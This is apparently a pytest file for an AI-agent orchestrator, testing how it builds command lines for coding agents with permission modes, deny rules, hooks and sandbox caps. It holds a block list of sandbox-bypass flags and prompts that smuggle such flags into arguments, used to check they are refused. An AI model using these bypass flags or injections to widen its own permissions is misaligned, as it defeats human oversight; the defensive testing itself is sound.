"""Agent adapters: registry, argv, capabilities, detection. No code outside adapters.py names a tool."""

import json
import os
import re
import stat
import sys
from pathlib import Path

import jsonschema
import pytest
from conftest import CONTRACTS

from orch import adapters, agentsdata, config, denyrules, reminder_settings
from orch.errors import Refused

ROOT = Path(__file__).resolve().parents[2]
NEW = "7f3c2a9e-1b4d-4c6e-9a21-5d0e8f7b3c11"
OLD = "f88ec2ca-0930-42dd-9d5e-00fbbd59067d"


def _agent(root, name, **kw):
    config.add_agent(
        root, name, kw.pop("command"), kw.pop("interactive", None), kw.pop("adapter", "generic"), approve=True
    )


def test_agents_json_is_the_contract_example_and_valid():
    schema = json.loads((CONTRACTS / "agent-adapter.schema.json").read_text(encoding="utf-8"))
    doc = agentsdata.load()
    jsonschema.Draft202012Validator(schema, format_checker=jsonschema.FormatChecker()).validate(doc)
    assert doc == json.loads((CONTRACTS / "examples/agent-adapter/valid-builtin.json").read_text("utf-8"))
    assert adapters.argv_errors(doc) == []
    assert set(adapters.builtin_names()) == {"claude", "codex", "generic"}
    assert adapters.caps("codex")["interactive_tmux"] is False and adapters.caps("codex")["hooks"] is False


def test_argv_rule_checker_finds_bad_templates():
    bad = {
        "adapters": {
            "x": {"oneshot": {"fresh": ["x", "{prompt}"]}, "live": {"fresh": ["x", "--s={session}x"]}}
        }
    }
    assert len(adapters.argv_errors(bad)) == 2


RUN_CMDS = (
    "check", "ask", "log", "ref", "needs", "wait", "ticket show", "ticket list", "ticket tree", "ticket new",
    "ticket summary", "ticket outcome", "ticket status", "ticket artifacts", "ticket artifacts-dir",
    "ticket wait", "ticket set", "ticket plan", "run done", "run input", "run status",
)  # fmt: skip
# `ticket plan` writes only the ticket's goal / not-included text: no exec, no config, no network
# the agent may run the orch commands a run needs (tasks, questions, summary), nothing else
# (ticket outcome writes only three short ticket texts: no exec, no config, no add-on or run control)
ORCH_OK = ["--allowedTools", ",".join(f"Bash(orch {c}:*)" for c in RUN_CMDS)]
# ask and auto mode also deny the approval commands and the approval store (defense in depth, git step 1)
DENY = adapters.permission_args("claude", None, "ask")
assert DENY[0] == "--disallowedTools" and "orch private" in DENY[1] and "agent-approvals" in DENY[1]
# the reminder hooks go in inline for a one-shot run (`orch work-check --hook claude`, never blocks)
_REMINDER_CMD = reminder_settings.hook_command("claude")  # absolute, quoted, never errors
# ... and in the SAME blob the record hooks (`orch record hook`, before and after every tool call, W2b 1.7)
_RECORD_CMD = reminder_settings.record_hook_command()
_REMINDER = {
    **{
        e: [{"hooks": [{"type": "command", "command": _REMINDER_CMD, "timeout": 5}]}]
        for e in ("SessionStart", "UserPromptSubmit")
    },
    **{
        e: [{"matcher": "*", "hooks": [{"type": "command", "command": _RECORD_CMD, "timeout": 5}]}]
        for e in ("PreToolUse", "PostToolUse")
    },
}
SETTINGS = ["--settings", json.dumps({"hooks": _REMINDER}, separators=(",", ":"))]


def _claude_argvs(root):
    """The snapshots: the permission flags plus the deny rules for this workspace (slice 1.4)."""
    deny = denyrules.merge_flag(DENY, denyrules.tool_patterns(denyrules.rules(root)))
    return (
        ["claude", "-p", "--session-id", NEW, *ORCH_OK, *SETTINGS, *deny, "--", "Do it"],
        ["claude", "-p", "--resume", OLD, *ORCH_OK, *SETTINGS, *deny, "--", "Do it"],
        deny,
    )


def test_claude_snapshots(proj):
    fresh, resume, deny = _claude_argvs(proj)
    v = {"prompt": "Do it", "new_session": NEW, "session": OLD, "permissions": "ask"}
    assert adapters.render("claude", "fresh", "oneshot", v, proj) == fresh
    assert adapters.render("claude", "resume", "oneshot", v, proj) == resume
    v["orch_hooks_file"] = ".orch/run/hooks-r_1.json"
    assert adapters.render("claude", "fresh", "live", v, proj) == [
        "claude", "--session-id", NEW, *ORCH_OK,
        "--settings", ".orch/run/hooks-r_1.json", *deny,
    ]  # fmt: skip
    assert adapters.render("claude", "resume", "live", v, proj)[:3] == ["claude", "--resume", OLD]


@pytest.fixture
def claude_help(monkeypatch, tmp_path):
    """A fake `claude` on PATH whose --help does (or does not) list the auto mode."""
    adapters._help_text.cache_clear()
    bindir = tmp_path / "bin"
    bindir.mkdir()
    exe = FakeHelp(bindir)
    exe.say('choices: "acceptEdits", "plan"')
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    yield exe
    adapters._help_text.cache_clear()


class FakeHelp:
    """`claude` whose --help prints one line: a sh script, or a .cmd on Windows (it runs no sh script)."""

    def __init__(self, bindir):
        self.path = bindir / ("claude.cmd" if sys.platform == "win32" else "claude")

    def say(self, line: str) -> None:
        if sys.platform == "win32":
            self.path.write_text(f"@echo off\r\necho {line}\r\n")
        else:
            self.path.write_text(f"#!/bin/sh\necho '{line}'\n")
            self.path.chmod(0o755)


@pytest.mark.parametrize("mode", ["oneshot", "live"])
def test_permission_modes_for_claude(claude_help, mode, proj):
    v = {"prompt": "p", "new_session": NEW, "orch_hooks_file": "h.json"}

    def flags(perm):
        argv = adapters.render("claude", "fresh", mode, {**v, "permissions": perm}, proj)
        assert "--allowedTools" in argv  # the orch list stays in every mode
        if mode == "oneshot":
            assert argv[-2:] == ["--", "p"]  # the prompt stays last
        i = argv.index("--permission-mode") if "--permission-mode" in argv else None
        return (
            ("--permission-mode", argv[i + 1])
            if i is not None
            else (("--dangerously-skip-permissions",) if "--dangerously-skip-permissions" in argv else ())
        )

    assert flags("ask") == ()
    assert flags("full") == ("--dangerously-skip-permissions",)
    assert flags("auto") == ("--permission-mode", "acceptEdits")  # this claude does not list auto
    claude_help.say('choices: "acceptEdits", "auto"')
    adapters._help_text.cache_clear()
    assert flags("auto") == ("--permission-mode", "auto")


def test_permission_mode_comes_from_the_workspace_config(proj, claude_help, run):
    assert config.permissions(proj) == "auto"  # the default
    assert (
        adapters.render("claude", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj).count(
            "acceptEdits"
        )
        == 1
    )
    code, out, _ = run("config", "set", "workspace.permissions", "full")
    assert code == 0 and "workspace.permissions = full" in out
    assert run("config", "get", "workspace.permissions")[1].strip() == "full"
    argv = adapters.render("claude", "fresh", "live", {"new_session": NEW, "orch_hooks_file": "h"}, proj)
    assert "--dangerously-skip-permissions" in argv and "acceptEdits" not in argv
    code, _, err = run("config", "set", "workspace.permissions", "yolo")
    assert code != 0 and "ask, auto, full" in err
    assert config.permissions(proj) == "full"
    assert "permissions" not in (config.read(proj).get("workspace") or {})  # not kept in the repo
    config.set_permissions(proj, "auto")
    config.set_key(proj, "workspace", "permissions", "full")  # a repo config cannot raise it
    assert config.permissions(proj) == "auto"
    assert "--dangerously-skip-permissions" not in adapters.render(
        "claude", "fresh", "live", {"new_session": NEW, "orch_hooks_file": "h"}, proj
    )


def test_an_agent_may_lower_the_mode_never_raise_it(proj, run, monkeypatch):
    monkeypatch.delenv("ORCH_AGENT", raising=False)
    assert run("config", "set", "workspace.permissions", "full", "--by", "human:me")[0] == 0
    code, _, err = run("config", "set", "workspace.permissions", "ask", "--by", "agent:claude")
    assert code == 0 and config.permissions(proj) == "ask"
    code, _, err = run("config", "set", "workspace.permissions", "full", "--by", "agent:claude")
    assert code != 0 and "Only a person" in err and config.permissions(proj) == "ask"
    monkeypatch.setenv("ORCH_AGENT", "claude")  # an agent in the environment counts, whatever --by says
    code, _, err = run("config", "set", "workspace.permissions", "auto", "--by", "human:me")
    assert code != 0 and config.permissions(proj) == "ask"


def test_the_mode_is_per_workspace(proj, tmp_path):
    other = tmp_path / "other"
    other.mkdir()
    config.set_permissions(proj, "full")
    assert config.permissions(other) == "auto"


@pytest.mark.skipif(os.name == "nt", reason="POSIX file modes")
def test_the_mode_file_is_private(proj):
    config.set_permissions(proj, "full")
    assert stat.S_IMODE(config._perm_file().stat().st_mode) == 0o600


BAD_CODEX = (
    "danger-full-access", "dangerously", "bypass", "network", "add-dir", "writable_roots", "--yolo",
    "read-only", "sandbox_permissions", 'approval_policy="on', "--full-auto",
)  # fmt: skip
SANDBOX = ["-c", 'sandbox_mode="workspace-write"', "-c", 'approval_policy="never"']


def test_codex_gets_the_workspace_sandbox_in_every_mode(proj):
    # exec cannot ask; a read-only default (no ~/.codex config) left orch-started codex unable to edit
    for perm in ("ask", "auto", "full"):  # `full` never widens codex
        assert adapters.render("codex", "fresh", "oneshot", {"prompt": "p", "permissions": perm}) == [
            "codex", "exec", "--json", *SANDBOX, "--", "p",
        ]  # fmt: skip
        assert adapters.permission_args("codex", proj, perm) == SANDBOX
    config.set_permissions(proj, "full")
    assert adapters.permission_args("codex", proj) == SANDBOX  # the workspace's own setting, same answer


def test_no_codex_argv_widens_the_sandbox():
    v = {"prompt": "p", "session": OLD, "new_session": NEW}
    for perm in ("ask", "auto", "full"):
        for kind in ("fresh", "resume"):
            argv = adapters.render("codex", kind, "oneshot", {**v, "permissions": perm})
            text = " ".join(argv)
            for bad in BAD_CODEX:
                assert bad not in text, (kind, perm, bad)
            assert (
                argv.count("-c") == 2 and 'sandbox_mode="workspace-write"' in argv
            )  # orch adds no root of its own (the person's own writable_roots/network settings still apply)
            assert argv[argv.index("--") - 1] == 'approval_policy="never"'  # nothing after it but the prompt


@pytest.fixture
def codex_home(proj, tmp_path_factory, monkeypatch):  # after proj: it clears CODEX_*
    d = tmp_path_factory.mktemp("codexhome")
    monkeypatch.setenv("CODEX_HOME", str(d))
    return d


def test_flag_like_prompt_stays_after_the_separator(codex_home):
    for prompt in (
        "-c",
        "--",
        "-c sandbox_mode=danger-full-access",
        "--dangerously-bypass-approvals-and-sandbox",
    ):
        argv = adapters.render("codex", "fresh", "oneshot", {"prompt": prompt, "permissions": "auto"})
        assert argv[-2:] == ["--", prompt] and argv[:-2].count("-c") == 2 and argv.count("--") >= 1


@pytest.mark.parametrize(
    "toml, stricter",
    [
        ('sandbox_mode = "read-only"\n', True),
        ('sandbox_mode = "workspace-write"\n', False),
        ('sandbox_mode = "danger-full-access"\n', False),  # capped to workspace-write
        ("this is [not toml", True),  # fail closed
        ("\xff\xfe", True),
        ("", False),
        ('profile = "p"\nsandbox_mode = "workspace-write"\n[profiles.p]\nsandbox_mode = "read-only"\n', True),
        (
            'profile = "p"\nsandbox_mode = "read-only"\n[profiles.p]\nsandbox_mode = "workspace-write"\n',
            False,
        ),
    ],
)
def test_a_stricter_personal_codex_setting_is_not_lifted(codex_home, proj, toml, stricter):
    (codex_home / "config.toml").write_text(toml)
    for perm in ("ask", "auto", "full"):
        got = adapters.permission_args("codex", proj, perm)
        assert got == ([] if stricter else SANDBOX), (toml, perm)
    note = adapters.permission_note("codex", proj, "auto")
    assert (note == "Codex is set to read-only on this computer: it can't change files.") is stricter


SB = ["-c", 'sandbox_mode="workspace-write"']
APPROVAL = ["-c", 'approval_policy="never"']


@pytest.mark.parametrize(
    "toml",
    [
        'profile = "p"\nprofiles = "x"\n',  # profiles not a table
        'profile = ["p"]\nprofiles = ["p"]\n',
        'profile = "p"\n[profiles]\np = "x"\n',  # profile not a table
        "profile = 3\nprofiles = 3\n",
    ],
)
def test_odd_profile_shapes_never_raise(codex_home, proj, toml):
    (codex_home / "config.toml").write_text(toml)
    assert adapters.permission_args("codex", proj, "auto") == SANDBOX


def test_unreadable_oversized_or_special_config_fails_closed(codex_home, proj):
    cfg = codex_home / "config.toml"
    cfg.write_text("# " + "x" * (1 << 20) + "\n")  # over 1 MiB
    assert adapters.permission_args("codex", proj, "auto") == []
    cfg.unlink()
    cfg.mkdir()  # not a regular file
    assert adapters.permission_args("codex", proj, "auto") == []
    assert adapters.permission_note("codex", proj, "auto")
    if hasattr(os, "mkfifo"):
        cfg.rmdir()
        os.mkfifo(cfg)  # would block a read forever
        assert adapters.permission_args("codex", proj, "auto") == []
    if os.name != "nt" and os.geteuid() != 0:
        cfg.unlink()
        cfg.write_text("")
        cfg.chmod(0)
        try:
            assert adapters.permission_args("codex", proj, "auto") == []
        finally:
            cfg.chmod(0o600)


@pytest.mark.parametrize("policy", ["untrusted", "on-request", "on-failure"])
def test_a_personal_approval_policy_is_kept(codex_home, proj, policy):
    (codex_home / "config.toml").write_text(f'approval_policy = "{policy}"\n')
    assert adapters.permission_args("codex", proj, "auto") == SB
    assert adapters.permission_note("codex", proj, "auto") is None
    (codex_home / "config.toml").write_text('approval_policy = "never"\n')
    assert adapters.permission_args("codex", proj, "auto") == SB + APPROVAL
    (codex_home / "config.toml").write_text(f'profile = "p"\n[profiles.p]\napproval_policy = "{policy}"\n')
    assert adapters.permission_args("codex", proj, "auto") == SB


def test_person_state_is_computed_once_per_start(codex_home, proj, monkeypatch):
    calls = []
    real = adapters.person_state
    monkeypatch.setattr(adapters, "person_state", lambda r: calls.append(1) or real(r))
    monkeypatch.setattr(
        "orch.addons.home", lambda root=None: Path(sys.prefix)
    )  # outside the start and temp folders
    st = adapters.person_for("codex", proj)
    adapters.render("codex", "fresh", "oneshot", {"prompt": "p", "person": st}, proj)
    adapters.permission_note("codex", proj, None, st)
    assert len(calls) == 1


def test_adapter_data_cannot_point_the_config_outside_the_tool_home(codex_home, proj):
    for home, file in (("/etc", "config.toml"), (".codex", "../x.toml"), ("..", "x")):
        rule = {"home": home, "file": file, "key": "sandbox_mode", "value": "read-only"}
        assert adapters.person_state(rule) == {"strict": True, "approval": True}


def test_missing_codex_config_gets_the_sandbox(codex_home, proj):
    assert (
        adapters.permission_args("codex", proj, "ask") == SANDBOX
        and adapters.permission_note("codex", proj) is None
    )


@pytest.mark.real_start_guard
def test_codex_refuses_to_start_where_orch_home_is_inside(codex_home, proj, monkeypatch, tmp_path_factory):
    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    with pytest.raises(Refused, match="Start it from a smaller folder") as e:
        adapters.check_start_folder("codex", proj)
    assert str(proj) not in str(e.value)
    # unknown ORCH_HOME fails closed

    def boom(root=None):
        raise Refused("x")

    monkeypatch.setattr("orch.addons.home", boom)
    with pytest.raises(Refused, match="cannot tell"):
        adapters.check_start_folder("codex", proj)


@pytest.mark.real_start_guard
def test_a_mixed_case_spelling_of_the_start_folder_is_the_same_folder(codex_home, proj, monkeypatch):
    (proj / "oh").mkdir(exist_ok=True)
    sw = Path(str(proj).swapcase())
    if not (sw.exists() and os.path.samefile(sw, proj)):
        pytest.skip("this filesystem is case-sensitive")
    monkeypatch.setattr("orch.addons.home", lambda root=None: sw / "oh")
    with pytest.raises(Refused):
        adapters.check_start_folder("codex", proj)


@pytest.mark.real_start_guard
def test_codex_refuses_an_orch_home_in_a_temp_folder(codex_home, proj, monkeypatch, tmp_path_factory):
    import tempfile

    outside = tmp_path_factory.mktemp("elsewhere")
    root = tmp_path_factory.mktemp("rootdir")
    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(outside.parent))
    monkeypatch.setattr("orch.addons.home", lambda r=None: outside / "oh")
    with pytest.raises(Refused, match="temporary folder"):
        adapters.check_start_folder("codex", root)
    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(root / "nothere"))
    monkeypatch.setattr("orch.addons.home", lambda r=None: Path.home() / ".orch-test-nope")
    if str(Path.home().resolve()).startswith(("/tmp", "/private/tmp")):
        pytest.skip("the home folder itself is under /tmp here")
    adapters.check_start_folder("codex", root)


def test_deep_toml_and_oversized_reads_fail_closed(codex_home, proj):
    cfg = codex_home / "config.toml"
    cfg.write_text("a = " + "[" * 100000 + "]" * 100000 + "\n")
    assert adapters.permission_args("codex", proj, "auto") == []  # RecursionError or a size refusal: closed
    assert adapters.permission_note("codex", proj, "auto")


def test_colon_and_backslash_in_adapter_paths_are_refused(codex_home, proj):
    for home, file in ((".codex", "a:b"), (".co\\dex", "config.toml"), ("c:x", "f")):
        rule = {"home": home, "file": file, "key": "sandbox_mode", "value": "read-only"}
        assert adapters.person_state(rule)["strict"] is True


@pytest.mark.real_start_guard
@pytest.mark.parametrize("agent", ["claude", "codex"])
def test_the_guard_refuses_every_agent(codex_home, proj, monkeypatch, agent):
    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    with pytest.raises(Refused, match="smaller folder"):
        adapters.check_start_folder(agent, proj)


@pytest.mark.real_start_guard
def test_the_guard_ignores_flags_and_config(codex_home, proj, monkeypatch):
    # a read-only person config means no flags at all, and still a refusal for an ORCH_HOME inside the folder
    (codex_home / "config.toml").write_text('sandbox_mode = "read-only"\n')
    assert adapters.permission_args("codex", proj, "auto") == []
    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    with pytest.raises(Refused):
        adapters.check_start_folder("codex", proj)


@pytest.mark.real_start_guard
def test_plan_and_start_refuse_when_orch_home_is_inside_the_start_folder(proj, new_ticket, monkeypatch):
    from orch import runs

    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    tid = new_ticket()
    for agent in ("codex", "claude"):
        with pytest.raises(Refused, match="smaller folder"):
            runs.plan(proj, tid, agent=agent)  # fresh
        with pytest.raises(Refused, match="smaller folder"):
            runs.plan(proj, tid, agent=agent, fresh=False)  # the resume path goes through plan too
        for mode in ("oneshot", "live"):
            with pytest.raises(Refused, match="smaller folder"):
                runs.start(proj, tid, "human:tester", agent=agent, mode=mode)


@pytest.mark.real_start_guard
def test_a_safe_setup_with_a_read_only_person_starts_without_flags(codex_home, proj, new_ticket, monkeypatch):
    from orch import runs

    (codex_home / "config.toml").write_text('sandbox_mode = "read-only"\n')
    monkeypatch.setattr("orch.addons.home", lambda root=None: Path(sys.prefix))  # outside start and temp
    p = runs.plan(proj, new_ticket(), agent="codex")
    assert p["argv"][:4] == ["codex", "exec", "--json", "--"] and p["argv"][-2] == "--"
    assert p["note"] == "Codex is set to read-only on this computer: it can't change files."


def test_agents_without_a_mapping_ignore_the_mode(proj):
    _agent(proj, "mine", command="mine {prompt}")
    config.set_permissions(proj, "full")
    assert adapters.permission_args("mine", proj) == []
    assert adapters.render("mine", "fresh", "oneshot", {"prompt": "p"}, proj) == ["mine", "p"]


def test_permission_line_names_the_mode(proj):
    assert adapters.permission_line(proj).startswith("Permissions auto:")
    config.set_permissions(proj, "ask")
    assert adapters.permission_line(proj).startswith("Permissions ask:")


def test_no_blanket_orch_permission_in_any_argv(proj):
    v = {"prompt": "p", "new_session": NEW, "session": OLD, "orch_hooks_file": "h.json", "stream": True}
    for name in adapters.builtin_names():
        for mode in ("oneshot", "live"):
            for kind in ("fresh", "resume"):
                try:
                    argv = adapters.render(name, kind, mode, v, proj) or []
                except Refused:
                    continue
                for at, item in enumerate(argv):
                    if argv[at - 1] == "--disallowedTools":
                        continue  # a deny list may name orch commands
                    for rule in item.split(","):
                        assert rule not in ("Bash(orch:*)", "Bash(orch *)", "Bash(orch)", "Bash"), (
                            name,
                            rule,
                        )
                        if rule.startswith("Bash(orch"):
                            sub = rule[len("Bash(orch ") : -len(":*)")]
                            assert sub in RUN_CMDS, rule  # never config, addon, run start, answer, init, ...


def test_codex_snapshots():
    v = {"prompt": "Do it", "session": "01a1ac76-7c05-70d2-824d-4854e0c9c3f8"}
    assert adapters.render("codex", "fresh", "oneshot", v) == [
        "codex", "exec", "--json", *SANDBOX, "--", "Do it",
    ]  # fmt: skip
    assert adapters.render("codex", "resume", "oneshot", v) == [
        "codex", "exec", "resume", "--json", v["session"], *SANDBOX, "--", "Do it",
    ]  # fmt: skip
    assert adapters.render("codex", "fresh", "live", v) is None  # no live mode


def test_prompt_starting_with_dash_is_not_an_option(proj):
    argv = adapters.render(
        "claude", "fresh", "oneshot", {"prompt": "--dangerously-x", "new_session": NEW}, proj
    )
    assert argv[-2:] == ["--", "--dangerously-x"]


def test_session_ids_are_checked():
    with pytest.raises(Refused):
        adapters.render("claude", "resume", "oneshot", {"prompt": "p", "session": "--evil"})


def test_generic_command_and_floor(proj):
    _agent(proj, "my-agent", command='my-agent --prompt "{prompt}" --x')
    v = {"prompt": "Work on t_1 -- now"}
    assert adapters.render("my-agent", "fresh", "oneshot", v, proj) == [
        "my-agent",
        "--prompt",
        v["prompt"],
        "--x",
    ]
    assert adapters.render("my-agent", "resume", "oneshot", v, proj) is None
    assert adapters.render("my-agent", "fresh", "live", v, proj) is None  # no interactive command
    c = adapters.caps("my-agent", proj)
    assert not any(v for k, v in c.items())
    assert adapters.describe("my-agent", proj) == "fresh each run"


def test_generic_prompt_is_appended_and_live_needs_interactive(proj):
    _agent(proj, "plain", command="plain-agent -q", interactive="plain-agent --live")
    assert adapters.render("plain", "fresh", "oneshot", {"prompt": "hi"}, proj) == [
        "plain-agent",
        "-q",
        "--",
        "hi",
    ]
    assert adapters.render("plain", "fresh", "live", {"prompt": "hi"}, proj) == ["plain-agent", "--live"]
    assert adapters.caps("plain", proj)["interactive_tmux"] is True
    assert adapters.describe("plain", proj) == "fresh each run, live session"


def test_generic_without_command_says_how_to_add_one(proj):
    with pytest.raises(Refused, match="orch config agent add"):
        adapters.render("generic", "fresh", "oneshot", {"prompt": "x"}, proj)


def test_user_entry_picks_a_builtin_adapter(proj):
    _agent(proj, "claude-work", command="ignored", adapter="claude")
    argv = adapters.render("claude-work", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj)
    assert argv[0] == "claude" and adapters.load("claude-work", proj)["name"] == "claude-work"
    with pytest.raises(Refused, match="No agent called"):
        adapters.load("nobody", proj)


def test_allow_goes_in_only_where_the_adapter_can_retry(proj):
    v = {"prompt": "p", "new_session": NEW, "allow": ["Bash(git push:*)", "Edit"]}
    argv = adapters.render("claude", "fresh", "oneshot", v, proj)
    i = len(argv) - 1 - argv[::-1].index("--allowedTools")  # the run's own, after the built-in orch one
    assert argv[i + 1] == "Bash(git push:*),Edit" and i < argv.index("--")
    assert "--allowedTools" not in (adapters.render("codex", "fresh", "oneshot", v) or [])
    _agent(proj, "gen", command="gen {prompt}")
    assert adapters.render("gen", "fresh", "oneshot", v, proj) == ["gen", "p"]
    assert adapters.permission_retry("claude") and not adapters.permission_retry("codex")
    with pytest.raises(Refused):
        adapters.render("claude", "fresh", "oneshot", {**v, "allow": ["--dangerous"]}, proj)


def test_hooks_doc_comes_from_data():
    d = adapters.hooks_doc("claude", "r_8k2m")
    cmds = {k: v[0]["hooks"][0]["command"] for k, v in d["hooks"].items()}
    assert cmds["Stop"] == "orch run event --run r_8k2m --kind idle"
    run_events = {"SessionStart", "Stop", "Notification", "UserPromptSubmit"}
    assert set(cmds) == run_events | {"PreToolUse", "PostToolUse"}
    for event in ("PreToolUse", "PostToolUse"):  # the record hook: the only group there, every tool
        assert d["hooks"][event] == [
            {"matcher": "*", "hooks": [{"type": "command", "command": _RECORD_CMD, "timeout": 5}]}
        ]
    for event in ("SessionStart", "UserPromptSubmit"):  # the reminder: a second command, with a timeout
        group = d["hooks"][event][1]  # its own group: the run-event group's matcher does not apply
        assert group == {
            "hooks": [{"type": "command", "command": reminder_settings.hook_command("claude"), "timeout": 5}]
        }
        cmd = group["hooks"][0]["command"]
        assert os.path.isabs(cmd[1 : cmd.index('"', 1)])  # the absolute interpreter, double-quoted
        assert "matcher" not in group and len(d["hooks"][event][0]["hooks"]) == 1
    assert len(d["hooks"]["Stop"]) == 1
    assert adapters.hooks_doc("codex", "r_1") is None


def _orch_groups(doc, event):
    return [h["command"] for g in doc["hooks"].get(event, []) for h in g["hooks"]]


def test_one_settings_blob_holds_the_work_check_and_the_record_hooks(proj):
    """W2b 1.7: the record hook is in the SAME generated settings as the work-check reminder: one --settings
    in the final argv of a oneshot and of a live run (two configs could override each other)."""
    argv = reminder_settings.record_hook_argv()
    exe = sys.executable.replace("\\", "/")
    assert argv == [exe, "-I", "-P", "-m", "orch", "record", "hook"]  # exactly `orch record hook`, never PATH
    assert os.path.isabs(argv[0]) and _RECORD_CMD == f'"{exe}" -I -P -m orch record hook'
    if os.name != "nt":
        import shlex

        assert shlex.split(_RECORD_CMD) == argv  # the line the tool's shell runs is that very argv

    def both(doc):
        for event in ("SessionStart", "UserPromptSubmit"):
            assert _REMINDER_CMD in _orch_groups(doc, event)
        for event in ("PreToolUse", "PostToolUse"):
            assert _orch_groups(doc, event) == [_RECORD_CMD]
        assert not any(_RECORD_CMD in _orch_groups(doc, e) for e in ("SessionStart", "UserPromptSubmit"))

    v = {"prompt": "p", "new_session": NEW, "session": OLD, "permissions": "ask", "stream": True}
    for kind in ("fresh", "resume"):
        one = adapters.render("claude", kind, "oneshot", v, proj)
        assert one.count("--settings") == 1
        both(json.loads(one[one.index("--settings") + 1]))
    # live: the per-run hooks file (hooks_doc) is the one --settings; the same blob is merged into it
    live = adapters.render("claude", "fresh", "live", {**v, "orch_hooks_file": "h.json"}, proj)
    assert live.count("--settings") == 1 and live[live.index("--settings") + 1] == "h.json"
    doc = adapters.hooks_doc("claude", "r_8k2m", proj)
    both(doc)
    # the run's own hooks stay
    assert _orch_groups(doc, "Stop") == ["orch run event --run r_8k2m --kind idle"]
    assert "orch run event --run r_8k2m --kind working" in _orch_groups(doc, "UserPromptSubmit")
    # a tool without record or reminder hooks gets none
    assert adapters.reminder_doc("codex") is None


@pytest.mark.parametrize(
    "exe, want",
    [
        ("C:\\Program Files\\Python312\\python.exe", '"C:/Program Files/Python312/python.exe"'),
        ("C:\\Users\\Ann Lee\\AppData\\Local\\uv\\py.exe", '"C:/Users/Ann Lee/AppData/Local/uv/py.exe"'),
        ("\\\\server\\share\\py\\python.exe", '"//server/share/py/python.exe"'),
    ],
)
def test_record_hook_command_for_a_windows_interpreter(monkeypatch, exe, want):
    """The Windows interpreter forms reminder_settings handles: forward slashes, double-quoted, one line that
    Git Bash (Claude's hook shell on Windows) and cmd both split back into the same argv.
    TODO(W2b 1.7, VM): prove on the Windows VM that the hook process is found in the claim's process tree
    (record_hook._parents has no Windows reader yet: a Windows hook records nothing, reason not_provable)."""
    import shlex

    monkeypatch.setattr(sys, "executable", exe)
    cmd = reminder_settings.record_hook_command()
    assert cmd == f"{want} -I -P -m orch record hook" and "\\" not in cmd
    argv = reminder_settings.record_hook_argv()
    assert shlex.split(cmd) == argv  # bash (Git Bash)
    cmd_words = [t[1:-1] if t[:1] == t[-1:] == '"' else t for t in shlex.split(cmd, posix=False)]
    assert cmd_words == argv  # cmd: the quoted path is one word (adapters._split's rule)
    monkeypatch.setattr(reminder_settings, "can_import_cached", lambda: True)  # no such interpreter here
    doc = adapters.reminder_doc("claude")
    assert _orch_groups(doc, "PreToolUse") == _orch_groups(doc, "PostToolUse") == [cmd]
    assert _orch_groups(doc, "SessionStart") == [f"{want} -I -P -m orch work-check --hook claude"]


@pytest.mark.parametrize("bad", ["C:\\x%PATH%\\python.exe", 'C:\\a"b\\python.exe', "C:\\a!b\\python.exe"])
def test_an_unsafe_windows_interpreter_path_gets_no_orch_hooks_at_all(monkeypatch, proj, bad):
    monkeypatch.setattr(sys, "executable", bad)
    with pytest.raises(ValueError):
        reminder_settings.record_hook_command()
    assert adapters.reminder_doc("claude") is None  # neither set: the run goes on without them
    v = {"prompt": "p", "new_session": NEW}
    assert "--settings" not in adapters.render("claude", "fresh", "oneshot", v, proj)


def test_session_from_output_for_codex():
    out = (
        '{"type":"thread.started","thread_id":"01a1ac76-7c05-70d2-824d-4854e0c9c3f8"}\nnoise\n{"type":"x"}\n'
    )
    assert adapters.parse_session("codex", out) == "01a1ac76-7c05-70d2-824d-4854e0c9c3f8"
    assert adapters.parse_session("codex", "no json here") is None
    assert adapters.parse_session("claude", out) is None  # orch chooses Claude's id
    assert adapters.session_mode("claude") == "chosen-by-orch" and adapters.session_mode("generic") == "none"


def test_detect_env():
    d = adapters.detect_env
    assert d({}) is None
    assert d({"ORCH_AGENT": "mine", "CLAUDECODE": "1"}) == "mine"
    assert d({"CLAUDECODE": "1"}) == "claude" and d({"CLAUDE_CODE_ENTRYPOINT": "cli"}) == "claude"
    assert d({"CODEX_HOME": "/x"}) == "codex"


def _fake_bin(dirpath: Path, name: str, version: str):
    p = dirpath / name
    p.write_text(f"#!/bin/sh\necho '{name} {version} (test)'\n")
    p.chmod(p.stat().st_mode | stat.S_IEXEC)


@pytest.mark.skipif(os.name == "nt", reason="shell script stubs")
def test_detect_finds_binaries_and_versions(tmp_path, monkeypatch):
    bindir = tmp_path / "bin"
    bindir.mkdir()
    _fake_bin(bindir, "claude", "2.1.318")
    monkeypatch.setenv("PATH", str(bindir) + os.pathsep + "/usr/bin" + os.pathsep + "/bin")
    rows = {r["name"]: r for r in adapters.detect()}
    assert rows["claude"]["found"] and rows["claude"]["version"] == "2.1.318"
    assert set(rows) == {"claude", "codex"}  # generic has nothing to look for
    monkeypatch.setenv("PATH", str(tmp_path / "nothing"))
    assert not any(r["found"] for r in adapters.detect())


# ---------------------------------------------------------------- the tool-name rule

NAME = re.compile(r"claude|codex", re.I)
SKIP_DIRS = {"agents", "tests", ".venv", "node_modules", "__pycache__", ".pytest_cache", "templates"}
SKIP_FILES = {"adapters.py", "uv.lock"}


def _hits() -> dict[str, int]:
    out = {}
    for base in (ROOT / "workspace/src/orch", ROOT / "workspace-addons"):
        for dirpath, dirs, files in os.walk(base):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            for f in files:
                if f in SKIP_FILES:
                    continue
                p = Path(dirpath) / f
                try:
                    n = len(NAME.findall(p.read_text(encoding="utf-8")))
                except (UnicodeDecodeError, OSError):
                    continue
                if n:
                    out[p.relative_to(ROOT).as_posix()] = n
    return out


def test_no_tool_names_outside_the_adapter():
    allowed = {}
    for line in (Path(__file__).with_name("tool_name_baseline.txt")).read_text(encoding="utf-8").splitlines():
        if line.strip() and not line.startswith("#"):
            path, n = line.rsplit(" ", 1)
            allowed[path] = int(n)
    bad = {p: n for p, n in _hits().items() if n > allowed.get(p, 0)}
    assert not bad, f"agent tool names outside adapters.py/agents.json (or more than the baseline): {bad}"


def test_folder_entry_cannot_shadow_a_builtin(proj, capsys):
    p = proj / ".orch" / "config.toml"
    p.parent.mkdir(exist_ok=True)
